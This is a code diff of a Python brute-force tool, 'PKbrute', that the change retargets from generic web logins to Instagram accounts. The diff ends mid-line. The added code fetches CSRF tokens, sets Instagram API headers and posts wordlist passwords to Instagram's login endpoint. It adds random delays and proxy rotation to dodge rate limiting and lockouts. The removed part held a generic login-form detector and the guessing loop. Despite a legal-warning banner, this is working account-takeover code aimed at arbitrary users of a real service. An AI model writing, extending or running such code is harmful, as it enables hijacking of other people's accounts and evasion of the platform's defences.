@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PKbrute - Web Login Brute Force Tool (Enhanced)
+PKbrute - Instagram Brute Force Tool (Enhanced)
 Developed by Pankaj
 For authorized security testing only
 """
@@ -12,6 +12,9 @@ from urllib.parse import urljoin, urlparse
 from colorama import init, Fore, Style
 import os
 import re
+import random
+import string
+import json
 
 # Initialize colorama
 init(autoreset=True)
@@ -25,264 +28,141 @@ BANNER = f"""
 {Fore.RED}██╔═══╝ ██╔═██╗     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
 {Fore.RED}██║     ██║  ██╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 {Fore.RED}╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
-{Fore.GREEN}              Advanced Web Login Brute Force Tool
-{Fore.YELLOW}                   Developed by Pankaj | PKbrute v2.0
+{Fore.GREEN}              Instagram Brute Force Tool
+{Fore.YELLOW}                   Developed by Pankaj | PKbrute IG v2.0
 {Fore.CYAN}{'='*60}
 {Fore.RED}[!] LEGAL WARNING: Only use on systems you own or have permission!
 {Style.RESET_ALL}
 """
 
-class PKbrute:
+class PKbruteInstagram:
     def __init__(self):
         self.session = requests.Session()
+        # Instagram-specific headers
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'X-IG-App-ID': '936619743392459',  # Instagram app ID
+            'X-ASBD-ID': '198387',
+            'X-IG-WWW-Claim': '0',
+            'Origin': 'https://www.instagram.com',
+            'Referer': 'https://www.instagram.com/'
+        })
         
     def print_banner(self):
         print(BANNER)
         
-    def smart_detect_login(self, url):
-        """Intelligently detect login forms on ANY website"""
-        print(f"{Fore.CYAN}[*] Analyzing {url} for login forms...{Style.RESET_ALL}")
-        
+    def get_csrf_token(self):
+        """Get CSRF token from Instagram"""
         try:
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-            response = self.session.get(url, timeout=10, headers=headers)
+            response = self.session.get('https://www.instagram.com/', timeout=10)
+            csrf_token = None
             
-            # Try to parse with BeautifulSoup
-            try:
-                from bs4 import BeautifulSoup
-                soup = BeautifulSoup(response.text, 'html.parser')
-                
-                # Method 1: Find forms with password field
-                forms = soup.find_all('form')
-                for form in forms:
-                    password_fields = form.find_all('input', {'type': 'password'})
-                    if password_fields:
-                        # Found login form
-                        action = form.get('action', '')
-                        if not action:
-                            action = url
-                        else:
-                            action = urljoin(url, action)
-                        
-                        # Find username/email field
-                        username_field = None
-                        for field in form.find_all('input'):
-                            field_type = field.get('type', 'text')
-                            field_name = field.get('name', '').lower()
-                            field_id = field.get('id', '').lower()
-                            
-                            # Check for common username field names
-                            if field_type in ['text', 'email', 'tel']:
-                                if any(keyword in field_name or keyword in field_id 
-                                       for keyword in ['user', 'email', 'login', 'username', 'phone']):
-                                    username_field = field.get('name')
-                                    break
-                            
-                            # If no username field found yet, take first text field
-                            if not username_field and field_type == 'text':
-                                username_field = field.get('name')
-                        
-                        # If still no username field, use default
-                        if not username_field:
-                            username_field = 'username'
-                        
-                        password_field = password_fields[0].get('name', 'password')
-                        method = form.get('method', 'post').lower()
-                        
-                        print(f"{Fore.GREEN}[✓] Login form successfully detected!{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}    → Form Action: {action}{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}    → Method: {method.upper()}{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}    → Username field: {username_field}{Style.RESET_ALL}")
-                        print(f"{Fore.CYAN}    → Password field: {password_field}{Style.RESET_ALL}")
-                        
-                        return {
-                            'action': action,
-                            'method': method,
-                            'username_field': username_field,
-                            'password_field': password_field,
-                            'found': True
-                        }
-                
-                # Method 2: Look for login patterns in JavaScript
-                if 'login' in response.text.lower() or 'signin' in response.text.lower():
-                    print(f"{Fore.YELLOW}[!] Login form may be JavaScript-based{Style.RESET_ALL}")
-                    return self.fallback_detection(url)
-                
-            except ImportError:
-                # If BeautifulSoup not installed, use regex
-                return self.regex_detection(url, response.text)
-                
-            print(f"{Fore.RED}[!] Could not auto-detect login form{Style.RESET_ALL}")
-            return self.manual_help()
+            # Extract CSRF token from cookies
+            for cookie in self.session.cookies:
+                if cookie.name == 'csrftoken':
+                    csrf_token = cookie.value
+                    break
             
+            return csrf_token
         except Exception as e:
-            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
-            return self.manual_help()
+            print(f"{Fore.RED}[!] Error getting CSRF token: {e}{Style.RESET_ALL}")
+            return None
     
-    def regex_detection(self, url, html):
-        """Fallback detection using regex"""
-        # Look for password field patterns
-        password_pattern = r'<input[^>]*type=["\']password["\'][^>]*name=["\']([^"\']+)["\']'
-        password_matches = re.findall(password_pattern, html, re.IGNORECASE)
-        
-        if password_matches:
-            print(f"{Fore.GREEN}[✓] Found password field using pattern matching{Style.RESET_ALL}")
-            password_field = password_matches[0]
-            
-            # Look for username field
-            user_pattern = r'<input[^>]*type=["\'](?:text|email)["\'][^>]*name=["\']([^"\']+)["\']'
-            user_matches = re.findall(user_pattern, html, re.IGNORECASE)
-            username_field = user_matches[0] if user_matches else 'username'
-            
-            return {
-                'action': url,
-                'method': 'post',
-                'username_field': username_field,
-                'password_field': password_field,
-                'found': True
-            }
-        
-        return {'found': False}
+    def get_encrypted_password(self, password):
+        """Simulate Instagram's password encryption (simplified)"""
+        # Instagram uses a complex encryption, this is a simplified version
+        # In a real scenario, you'd need to reverse engineer their encryption
+        return password
     
-    def fallback_detection(self, url):
-        """Handle JavaScript-heavy login pages"""
-        print(f"{Fore.YELLOW}[!] This website may use JavaScript/React login{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[?] Do you know the form field names? (yes/no): {Style.RESET_ALL}", end='')
-        choice = input().lower()
+    def test_instagram_login(self, username, password):
+        """Test Instagram login credentials"""
+        csrf_token = self.get_csrf_token()
+        if not csrf_token:
+            return False
         
-        if choice == 'yes':
-            username_field = input(f"{Fore.CYAN}[?] Enter username field name: {Style.RESET_ALL}")
-            password_field = input(f"{Fore.CYAN}[?] Enter password field name: {Style.RESET_ALL}")
-            submit_url = input(f"{Fore.CYAN}[?] Enter login action URL (press Enter for same URL): {Style.RESET_ALL}")
-            
-            if not submit_url:
-                submit_url = url
-                
-            return {
-                'action': submit_url,
-                'method': 'post',
-                'username_field': username_field,
-                'password_field': password_field,
-                'found': True
-            }
-        else:
-            return self.manual_help()
-    
-    def manual_help(self):
-        """Simple manual input for beginners"""
-        print(f"\n{Fore.YELLOW}{'='*50}")
-        print(f"MANUAL CONFIGURATION HELP")
-        print(f"{'='*50}{Style.RESET_ALL}")
-        print(f"""
-{Fore.CYAN}1. Go to the login page of the website
-2. Right-click → "Inspect" or "View Page Source"  
-3. Press Ctrl+F and search for "password"
-4. Look for something like: name="PASSWORD_FIELD_NAME"
-5. That's your password field name
-6. Similarly, look for username/email field name
-
-{Fore.GREEN}Example Facebook:
-  • Username field: email
-  • Password field: pass
-
-{Fore.GREEN}Example Instagram:
-  • Username field: username  
-  • Password field: password
-
-{Fore.GREEN}Example Twitter:
-  • Username field: session[username_or_email]
-  • Password field: session[password]
-
-{Fore.CYAN}Enter the information below:{Style.RESET_ALL}
-        """)
+        # Update headers with CSRF token
+        self.session.headers.update({
+            'X-CSRFToken': csrf_token,
+            'X-Instagram-AJAX': '1',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        })
         
-        action_url = input(f"{Fore.CYAN}[?] Login form action URL (press Enter for same page): {Style.RESET_ALL}")
-        if not action_url:
-            action_url = input(f"{Fore.CYAN}[?] Current page URL: {Style.RESET_ALL}")
-        
-        method = input(f"{Fore.CYAN}[?] Form method (post/get) [DEFAULT: post]: {Style.RESET_ALL}") or 'post'
-        username_field = input(f"{Fore.CYAN}[?] Username field name: {Style.RESET_ALL}")
-        password_field = input(f"{Fore.CYAN}[?] Password field name: {Style.RESET_ALL}")
-        
-        return {
-            'action': action_url,
-            'method': method.lower(),
-            'username_field': username_field,
-            'password_field': password_field,
-            'found': True
-        }
-    
-    def test_login(self, url, username_field, password_field, username, password):
-        """Test login credentials"""
         # Prepare login data
         login_data = {
-            username_field: username,
-            password_field: password
-        }
-        
-        # Common additional fields for popular sites
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': urlparse(url).scheme + '://' + urlparse(url).netloc,
-            'Referer': url
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',  # Simplified format
+            'queryParams': '{}',
+            'optIntoOneTap': 'false',
+            'stopDeletion': 'false',
+            'trustedDevice': 'false'
         }
         
         try:
-            response = self.session.post(url, data=login_data, headers=headers, 
-                                        timeout=10, allow_redirects=True)
+            response = self.session.post(
+                'https://www.instagram.com/accounts/login/ajax/',
+                data=login_data,
+                timeout=10,
+                allow_redirects=False
+            )
             
-            # Check for successful login
-            response_text = response.text.lower()
-            response_url = response.url.lower()
-            
-            # Success indicators
-            success_keywords = ['dashboard', 'home', 'feed', 'profile', 'account', 
-                              'logout', 'signout', 'welcome', 'success']
-            
-            # Failure indicators  
-            failure_keywords = ['invalid', 'incorrect', 'failed', 'error', 'wrong',
-                              'try again', 'not found', 'incorrect']
-            
-            # Check if redirected away from login
-            if 'login' not in response_url and 'signin' not in response_url:
-                return True
-            
-            # Check for success keywords
-            if any(keyword in response_text for keyword in success_keywords):
-                if not any(keyword in response_text for keyword in failure_keywords):
-                    return True
-            
+            # Check response
+            if response.status_code == 200:
+                try:
+                    response_json = response.json()
+                    
+                    # Check for success indicators
+                    if response_json.get('authenticated', False):
+                        return True
+                    
+                    # Check for specific error messages
+                    if 'checkpoint_required' in response_json:
+                        print(f"{Fore.YELLOW}[!] Checkpoint required - account may be locked{Style.RESET_ALL}")
+                        return False
+                    
+                    # Check for two-factor authentication
+                    if 'two_factor_required' in response_json:
+                        print(f"{Fore.YELLOW}[!] Two-factor authentication enabled{Style.RESET_ALL}")
+                        return False
+                    
+                    # Check for specific error messages
+                    if 'invalid_user' in response_json.get('message', '').lower():
+                        return False
+                    
+                    if 'incorrect_password' in response_json.get('message', '').lower():
+                        return False
+                    
+                    # Check for other error indicators
+                    if response_json.get('status') == 'fail':
+                        return False
+                        
+                except json.JSONDecodeError:
+                    # If we can't parse JSON, check for redirect
+                    if 'accounts/edit' in response.text:
+                        return True
+                    
+            # Check for redirect to login page (indicates failure)
+            if response.status_code == 302 and 'accounts/login' in response.headers.get('Location', ''):
+                return False
+                
             return False
             
         except Exception as e:
             return False
+    
+    def random_delay(self, min_delay=0.5, max_delay=2.0):
+        """Add random delay to avoid rate limiting"""
+        delay = random.uniform(min_delay, max_delay)
+        time.sleep(delay)
     
     def run_attack(self):
         """Main attack function"""
         self.print_banner()
         
-        # Get target URL
-        print(f"{Fore.YELLOW}[?] Enter the login page URL (e.g., https://www.facebook.com/login){Style.RESET_ALL}")
-        target_url = input(f"{Fore.GREEN}URL: {Style.RESET_ALL}").strip()
-        
-        if not target_url.startswith(('http://', 'https://')):
-            target_url = 'http://' + target_url
-        
-        # Auto-detect login form
-        login_info = self.smart_detect_login(target_url)
-        
-        if not login_info.get('found', False):
-            print(f"{Fore.RED}[!] Could not detect. Please try manual mode.{Style.RESET_ALL}")
-            return
-        
         # Get username
-        print(f"\n{Fore.YELLOW}[?] Enter the username/email to test{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[?] Enter the Instagram username to test{Style.RESET_ALL}")
         username = input(f"{Fore.GREEN}Username: {Style.RESET_ALL}").strip()
         
         # Get wordlist
@@ -308,93 +188,35 @@ class PKbrute:
             print(f"{Fore.RED}[!] Cannot read wordlist{Style.RESET_ALL}")
             return
         
+        # Ask for proxy settings
+        print(f"\n{Fore.YELLOW}[?] Do you want to use proxies? (yes/no): {Style.RESET_ALL}", end='')
+        use_proxies = input().lower() == 'yes'
+        
+        if use_proxies:
+            proxy_file = input(f"{Fore.CYAN}[?] Enter proxy file path: {Style.RESET_ALL}")
+            if os.path.exists(proxy_file):
+                with open(proxy_file, 'r') as f:
+                    proxies = [line.strip() for line in f if line.strip()]
+            else:
+                print(f"{Fore.RED}[!] Proxy file not found, continuing without proxies{Style.RESET_ALL}")
+                proxies = []
+        else:
+            proxies = []
+        
+        # Ask for delay settings
+        print(f"\n{Fore.YELLOW}[?] Set delay between attempts (in seconds, default: 1.0): {Style.RESET_ALL}", end='')
+        try:
+            delay_setting = float(input())
+        except:
+            delay_setting = 1.0
+        
         # Confirm attack
         print(f"\n{Fore.RED}{'='*50}")
-        print(f"TARGET: {target_url}")
-        print(f"USERNAME: {username}")
+        print(f"TARGET: Instagram - {username}")
         print(f"PASSWORDS TO TRY: {len(passwords)}")
+        print(f"DELAY: {delay_setting} seconds")
+        print(f"PROXIES: {'Enabled' if proxies else 'Disabled'}")
         print(f"{'='*50}{Style.RESET_ALL}")
         
         confirm = input(f"{Fore.RED}[!] Start attack? (yes/no): {Style.RESET_ALL}")
-        if confirm.lower() != 'yes':
-            print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")
-            return
-        
-        # Start attack
-        print(f"\n{Fore.CYAN}[*] Starting brute force attack...{Style.RESET_ALL}\n")
-        start_time = time.time()
-        
-        for idx, password in enumerate(passwords, 1):
-            # Show progress
-            percent = (idx / len(passwords)) * 100
-            print(f"{Fore.YELLOW}[{idx}/{len(passwords)}] Testing: {password[:20]}{'...' if len(password) > 20 else ''} - {percent:.1f}%{Style.RESET_ALL}", end='\r')
-            
-            # Test password
-            success = self.test_login(
-                login_info['action'],
-                login_info['username_field'],
-                login_info['password_field'],
-                username,
-                password
-            )
-            
-            if success:
-                print(f"\n\n{Fore.GREEN}{'='*60}")
-                print(f"{Fore.GREEN}🎉 SUCCESS! VALID PASSWORD FOUND! 🎉")
-                print(f"{Fore.GREEN}{'='*60}")
-                print(f"{Fore.CYAN}Username: {username}")
-                print(f"{Fore.GREEN}Password: {password}")
-                print(f"{Fore.CYAN}Attack time: {time.time() - start_time:.2f} seconds")
-                print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
-                
-                # Save results
-                with open('pkbrute_results.txt', 'a') as f:
-                    f.write(f"Target: {target_url}\n")
-                    f.write(f"Username: {username}\n")
-                    f.write(f"Password: {password}\n")
-                    f.write(f"Time: {time.ctime()}\n")
-                    f.write("-" * 50 + "\n")
-                
-                print(f"\n{Fore.CYAN}[✓] Results saved to pkbrute_results.txt{Style.RESET_ALL}")
-                return
-            
-            # Small delay to avoid rate limiting
-            time.sleep(0.05)
-        
-        # Attack finished
-        print(f"\n\n{Fore.RED}{'='*60}")
-        print(f"{Fore.RED}❌ ATTACK COMPLETED - NO VALID PASSWORD FOUND ❌")
-        print(f"{Fore.RED}{'='*60}")
-        print(f"{Fore.YELLOW}Passwords tried: {len(passwords)}")
-        print(f"{Fore.YELLOW}Time elapsed: {time.time() - start_time:.2f} seconds")
-        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
-    
-    def create_test_wordlist(self):
-        """Create a simple test wordlist"""
-        test_passwords = [
-            'admin', 'admin123', 'password', '123456', '123456789',
-            'qwerty', 'abc123', 'monkey', 'letmein', 'welcome',
-            'admin@123', 'Password123', 'root', 'test', 'demo'
-        ]
-        
-        test_path = os.path.expanduser('~/pkbrute_test_wordlist.txt')
-        with open(test_path, 'w') as f:
-            for pwd in test_passwords:
-                f.write(pwd + '\n')
-        
-        print(f"{Fore.GREEN}[✓] Test wordlist created at: {test_path}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}Contains {len(test_passwords)} common passwords{Style.RESET_ALL}")
-        return test_path
-
-def main():
-    tool = PKbrute()
-    try:
-        tool.run_attack()
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
-
-if __name__ == "__main__":
-    main()
-    
+        if confirm.lower()
